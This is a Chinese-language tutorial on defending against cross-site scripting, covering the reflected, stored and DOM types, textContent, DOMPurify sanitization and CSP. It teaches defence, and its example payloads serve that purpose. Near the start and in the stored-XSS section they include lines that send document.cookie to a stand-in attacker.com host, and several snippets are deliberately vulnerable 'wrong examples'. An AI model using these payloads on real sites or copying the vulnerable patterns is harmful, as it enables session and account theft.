## 概述

XSS（Cross-Site Scripting，跨站脚本攻击）是攻击者往网页注入恶意脚本，让它在受害者浏览器里执行。脚本一旦执行，就能窃取 Cookie、劫持会话、篡改页面。

```text
XSS 的危害：
1. 窃取 Cookie / 会话 —— document.cookie 发给攻击者
2. 劫持账号 —— 伪造登录态执行敏感操作
3. 钓鱼 —— 注入假表单骗取密码
4. 篡改页面 —— 挂广告、重定向到恶意站
5. 内网探测 —— 借受害者浏览器扫描内网
```

```js
// 攻击载荷示例：把受害者 Cookie 发到攻击者服务器
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
```

## XSS 三种类型

按注入位置和触发方式，XSS 分三类。

```text
Reflected XSS（反射型）—— 恶意代码在请求里，服务端原样回显到页面
Stored XSS（存储型）  —— 恶意代码存进数据库，其他用户访问时触发
DOM XSS（DOM 型）     —— 恶意代码由前端 JS 直接写入 DOM，不经服务端
```

```text
对比维度         Reflected      Stored          DOM
注入位置         请求参数       数据库          前端 JS 数据源
持久化           否             是              否
触发对象         点击链接者     所有访问者      当前页面用户
典型场景         搜索结果回显   评论区/昵称      location.hash
```

## Reflected XSS

反射型 XSS 是最常见的一种：攻击者构造带恶意代码的链接，受害者点击后，服务端把参数回显进页面，脚本执行。

```text
攻击流程：
1. 攻击者构造链接：/search?q=<script>...</script>
2. 受害者点击链接
3. 服务端把 q 原样拼进 HTML 返回
4. 浏览器解析 HTML 时执行了脚本
```

```js
// 服务端错误示范（伪代码）—— 直接拼接用户输入
// 返回的 HTML：<p>搜索 " <script>...</script> " 的结果</p>
const html = `<p>搜索 "${req.query.q}" 的结果</p>`;
```

```text
防护：
1. 输出转义 —— 把 < > " ' & 转成实体
2. 参数校验 —— 白名单校验输入
3. 模板引擎默认转义 —— React/Vue 默认转义变量
```

```js
// 转义函数
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

## Stored XSS

存储型 XSS 危害最大：恶意代码存进数据库，所有访问该内容的用户都会被攻击。

```text
典型场景：
1. 评论区 —— 发一条带 <script> 的评论
2. 用户昵称 —— 注册名含恶意代码
3. 私信/留言板 —— 消息内容未过滤
4. 富文本编辑器 —— 提交含脚本的 HTML
```

```js
// 存储型 XSS 的扩散：一个攻击，无数受害者
// 攻击者发布评论：
//   <img src=x onerror="fetch('https://attacker.com/c=' + document.cookie)">
// 服务端存进数据库，任何打开该评论的用户都会中招
```

```text
防护：
1. 入库前/输出时都做消毒（Sanitization）
2. 富文本用白名单过滤，禁用 on* 事件和 javascript:
3. 评论内容显示用 textContent，不用 innerHTML
```

## DOM XSS

DOM XSS 的注入点在前端：恶意数据来自 URL、localStorage、postMessage 等，由前端 JS 写进 DOM 时触发。

```js
// 危险示例：把 URL 参数直接塞进 innerHTML
const search = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = search;
// 访问 ?q=<img src=x onerror=alert(1)> 即触发
```

```text
DOM XSS 的危险来源（sink）：
1. innerHTML / outerHTML / document.write
2. eval / setTimeout(string) / new Function
3. location.href / location.replace（javascript: 协议）
4. <a href> 的 href 属性注入 javascript:
```

```text
危险源（source）：
1. location 的 search / hash
2. document.referrer
3. postMessage 收到的数据
4. localStorage / sessionStorage
```

## innerHTML 与 textContent

innerHTML 会把字符串当 HTML 解析，textContent 只当纯文本，这是 XSS 防护的第一道防线。

```js
// 危险：innerHTML 解析 HTML，注入的标签会执行
el.innerHTML = '<img src=x onerror="alert(1)">';  // 触发弹窗

// 安全：textContent 只当文本，不解析标签
el.textContent = '<img src=x onerror="alert(1)">';  // 原样显示成文本
```

```js
// 常见错误：用 innerHTML 插入用户昵称
// 正确做法：昵称、评论等纯文本一律 textContent
const name = userProfile.nickname;  // 可能是 "<script>..."
nicknameEl.textContent = name;      // 安全
```

```text
innerHTML 的坑：
1. <img onerror> 能绕过只有 <script> 的过滤
2. <svg onload>、<body onload> 等标签事件都能执行
3. javascript: 协议链接点开也执行
结论：插入纯文本用 textContent，插入 HTML 必须消毒
```

## Sanitization

Sanitization（消毒）是对 HTML 做白名单过滤，保留安全标签、去掉危险属性和事件。用成熟的库，别手写正则。

```js
// DOMPurify：最流行的 HTML 消毒库
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)><b>加粗</b>';
const clean = DOMPurify.sanitize(dirty);
console.log(clean); // <img src="x"><b>加粗</b>
// onerror 被剥离，保留安全标签
```

```js
// 配置白名单
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'p', 'a'],           // 只允许这些标签
  ALLOWED_ATTR: ['href', 'title'],              // 只允许这些属性
  ALLOW_DATA_ATTR: false,                       // 禁止 data-* 属性
});
```

```text
消毒原则：
1. 白名单优于黑名单 —— 默认拒绝，显式放行
2. 用成熟库 —— DOMPurify/sanitize-html，别手写正则
3. 服务端也消毒 —— 前端消毒防不了绕过，服务端兜底
4. 富文本场景 —— 消毒后仍要配 CSP 双重防护
```

## CSP

CSP（Content Security Policy，内容安全策略）是浏览器级的防线，通过响应头声明允许加载哪些资源、执行哪些脚本，即使 XSS 注入成功也能限制其行为。

```text
CSP 响应头示例：
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src *; style-src 'self' 'unsafe-inline'
```

```js
// 通过 meta 标签设置（通常用响应头更佳）
// <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

```text
CSP 关键指令：
1. default-src —— 默认策略
2. script-src —— 允许的脚本来源
3. script-src 'nonce-xxx' —— 仅允许带指定 nonce 的脚本
4. object-src 'none' —— 禁用 flash 等插件
5. img-src / style-src —— 图片、样式来源
```

```text
CSP 防 XSS 原理：
1. 禁止内联脚本（script-src 不含 unsafe-inline）
2. 禁止 eval（除非显式 unsafe-eval）
3. 限制脚本只能从白名单域名加载
即使攻击者注入了 <script>，浏览器也拒绝执行。
```

## 应用场景实战

### 场景一：评论区防存储型 XSS

```js
// 前端提交前消毒 + 展示时纯文本
import DOMPurify from 'dompurify';

function submitComment(raw) {
  // 普通文本评论：服务端存纯文本，展示用 textContent
  return { content: raw, isHtml: false };
}

function renderComment(comment) {
  const el = document.createElement('div');
  if (comment.isHtml) {
    el.innerHTML = DOMPurify.sanitize(comment.content); // 富文本消毒
  } else {
    el.textContent = comment.content;                    // 纯文本直接显示
  }
  return el;
}
```

### 场景二：富文本编辑器白名单消毒

```js
// 富文本内容消毒，只保留安全的排版标签
const allowList = {
  ALLOWED_TAGS: ['p', 'b', 'i', 'u', 'br', 'ul', 'ol', 'li', 'a', 'blockquote'],
  ALLOWED_ATTR: ['href', 'rel', 'target'],
  ALLOWED_URI_REGEXP: /^(https?|mailto):/i,   // 只允许 http/https/mailto 链接
};

const safeHtml = DOMPurify.sanitize(editorContent, allowList);
// <script>、<img onerror>、javascript: 链接全部被清除
```

## 最佳实践与踩坑记录

### 最佳实践

1. 插入纯文本永远用 textContent，不用 innerHTML
2. 富文本 HTML 必须消毒，用 DOMPurify 白名单过滤
3. 输出转义兜底：即使消毒也再转义一次
4. 配置 CSP 做纵深防御，禁用内联脚本和 eval
5. 服务端和前端双重消毒，别只信前端

### 踩坑记录

```text
坑 1：只过滤 <script> 标签
结论：绕过了 <script> 过滤还是被注入。
原因：<img onerror>、<svg onload> 等事件标签也能执行脚本。
解法：用白名单消毒库，而非针对个别标签的黑名单。

坑 2：innerHTML 插用户昵称
结论：昵称带脚本时执行了。
原因：innerHTML 解析 HTML，昵称里的标签被当代码。
解法：纯文本一律 textContent。

坑 3：前端消毒后服务端不消毒
结论：直接调接口绕过前端，注入成功。
原因：前端消毒可被开发者工具/直接请求绕过。
解法：服务端也必须消毒，前端只是体验优化。

坑 4：CSP 配了 unsafe-inline
结论：CSP 形同虚设，XSS 照样执行。
原因：unsafe-inline 允许内联脚本，注入的 <script> 也放行。
解法：用 nonce 或 hash 替代 unsafe-inline。

坑 5：把用户输入拼进 href
结论：javascript: 协议链接点开执行脚本。
原因：href 支持 javascript: 伪协议。
解法：URL 白名单校验，只允许 http/https，或用 textContent 渲染。
```
